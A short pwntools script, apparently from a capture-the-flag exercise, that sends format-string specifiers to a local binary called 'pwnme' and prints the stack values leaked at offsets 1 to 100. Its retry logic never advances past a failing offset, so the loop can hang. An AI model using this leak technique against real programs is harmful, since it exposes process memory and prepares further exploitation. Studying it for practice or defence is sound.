#!/usr/bin/env python3
from pwn import *



elf = context.binary = ELF('./pwnme', checksec=False)
context.terminal = ['alacritty', '-e', 'zsh', '-c']



io = process(elf.path)

#payload = b"%1$p"
#io.sendline(payload)
#print(io.recv())



i = 1
while i <= 100:
    try:
        io = process(elf.path,level='error')
        payload = f"%{i}$p"
        io.sendline(payload)
        leak = io.recv().strip().split(b'?',1)[1]
        print(f"Offset {i} has {leak}")
        i += 1
    except EOFError:
        pass
